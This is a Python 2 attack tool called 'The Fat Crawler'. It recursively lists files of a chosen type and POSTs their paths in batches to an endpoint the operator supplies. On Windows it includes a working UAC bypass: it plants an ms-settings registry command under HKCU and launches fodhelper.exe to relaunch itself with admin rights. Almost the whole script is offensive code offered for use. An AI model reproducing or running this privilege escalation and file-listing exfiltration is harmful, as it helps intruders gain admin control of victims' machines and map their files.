#!/usr/bin/env python
# -*- coding: utf-8; mode: python; py-indent-offset: 4; indent-tabs-mode: nil -*-
# vim: fileencoding=utf-8 tabstop=4 expandtab shiftwidth=4

"""
The Fat Crawler.
This is a simple file crawler that performs a recursive lookup on the given folder and file type.
The current supported arguments to run this crawler are:

-d --dir       The start directory path
-t --file-type The file type to lookup
-c --chunck    The chunck size to report to the server
-e --endpoint  The endpoint to report the enumerated files
-f --force-uac Forces an UAC bypass
-v --verbose   Enables the verbose mode

Note: The script will try to bypass the UAC if the the operational system is a "NT family"
      and the user has no administrative privileges.

      This script was tested on Windows 10, Ubuntu Server 16.10 and Kali Linux only
"""

import argparse
import os 
import sys
import fnmatch
import threading
import ctypes
import urllib, urllib2
import logging as log
import subprocess

try:
    import _winreg
except:
    pass

parser = argparse.ArgumentParser(prog='fatcrawler',  description='The Fat Crawler')
parser.add_argument('-d', '--dir',       metavar = '',        required=True, help = 'The start directory')
parser.add_argument('-t', '--file-type', metavar = '',        required=True, help = 'The file type')
parser.add_argument('-c', '--chunck',    metavar ='',         default=10,    help = 'The chunck size to report to the server')
parser.add_argument('-e', '--endpoint',  metavar = '',        required=True, help = 'The endpoint url to send the enumerated files')
parser.add_argument('-f', '--force-uac', action='store_true', help='Force UAC bypass')
parser.add_argument('-v', '--verbose',   action='store_true', help='Enables the verbose mode')

banner = '''
        |\_,,____
        ( o__o \/
        /(..)  \\   Fat Crawler
       (_ )--( _)  It'll swallow everything
       / ""--"" \\ 
,===,=| |-,,,,-| |==,==
|   |  WW   |  WW   |
|   |   |   |   |   |

[k1dd0] - v1
'''

# Windows constants
REG_PATH              = "Software\Classes\ms-settings\shell\open\command"
CMD                   = r"C:\Windows\\system32\cmd.exe"
FOD_HELPER            = r"C:\\Windows\\system32\\fodhelper.exe"
PYTHON_EXE            = r"C:\Python27\python.exe"
DEFAULT_REG_KEY       = '(default)'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_running_as_admin():
    '''
    Checks if the script is running with administrator privileges.
    Returns True if is running as admin, False otherwise.
    '''
    if os.name == 'nt':        
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    else:
        return os.getuid() == 0


def create_reg_key(key, value):
    '''
    Tries to create a reg key
    '''
    try:        
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)        
        _winreg.CloseKey(registry_key)
    except WindowsError:        
        raise

def bypass_uac(runner):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(DEFAULT_REG_KEY, runner)    
    except WindowsError:
        log.info('[!] FATAL: could not bypass the UAC')
        raise

def report_data(endpoint, files):
    '''
    Performs a POST request on the given endpoint
    '''
    data = urllib.urlencode({'files': files})
    req = urllib2.Request(endpoint, data)
    urllib2.urlopen(req)    
        
def execute(args):
    '''
    Executes the fat crawler
    '''
    if args.verbose:
        log.basicConfig(format='%(message)s', level = log.DEBUG)
    
    log.info(banner)
    log.info('[+] Checking for privileged access...')

    if not is_running_as_admin():
        log.info('[+] The script is not running with administrative privileges')
        log.info('[+] Checking the operational system...')
        log.info('[+] OS: {}'.format(os.name))
        if os.name == 'nt' and args.force_uac:
            log.info('[+] Trying to bypass the UAC')
            try:                
                current_dir = os.path.dirname(os.path.realpath(__file__)) + r'\fatcrawler.py'
                runner = PYTHON_EXE + ' ' + current_dir + ' ' + ' '.join(sys.argv[1:])
                bypass_uac(runner)                
                subprocess.Popen(subprocess)
                subprocess.Popen(FOD_HELPER)
                sys.exit(0)                
            except WindowsError:
                log.info('[!] Could not operate in UAC bypass force mode')
                sys.exit(1)
        else:
            log.info('[+] Nothing to do, skiping UAC bypass')
    else:
        log.info('[+] The script is running with administrative privileges!')
    
    files = []
    for root, dirnames, filenames in os.walk(args.dir):
        for filename in fnmatch.filter(filenames, args.file_type):
            file_path = os.path.join(root, filename)
            files.append(file_path)
            log.info('[+] File found: {}'.format(file_path))

            if len(files) == args.chunck:
                files_copy = list(files)
                thread = threading.Thread(target=report_data, args=(args.endpoint, files_copy))
                thread.start()                
                files = []

    # check if there is any file left
    if (len(files) > 0):
        log.info('[+] Preparing to shutdown, flushing the file list...')
        files_copy = list(files)
        thread = threading.Thread(target=report_data, args=(args.endpoint, files_copy))
        thread.start()
        files = []
        
    log.info('[+] Shutting down the fat crawler')
    log.info('[+] Bye')
    sys.exit(0)

if __name__ == '__main__':
    try:        
        args = parser.parse_args()
        execute(args)
    except KeyboardInterrupt:
        sys.exit(0)